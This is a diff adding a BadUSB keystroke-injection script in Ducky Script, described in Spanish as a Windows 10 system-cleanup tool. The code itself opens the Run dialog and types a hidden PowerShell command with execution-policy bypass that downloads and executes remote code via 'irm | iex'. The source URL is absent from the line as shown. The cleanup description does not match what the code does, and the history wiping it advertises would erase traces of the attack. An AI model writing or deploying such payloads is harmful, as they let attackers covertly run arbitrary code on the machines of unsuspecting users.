@@ -1,0 +1,17 @@
+REM Title: Script de Limpieza del Sistema
+REM Author: mrflippermen
+REM Description: Este script de PowerShell realiza varias tareas de limpieza en el sistema, incluyendo la eliminación de archivos temporales, el historial del cuadro de ejecución, el historial de PowerShell y el contenido de la papelera de reciclaje. También muestra mensajes en ventanas emergentes para informar al usuario sobre el estado de cada operación.
+REM Target: Windows 10
+
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm  | iex
+ENTER
+
+
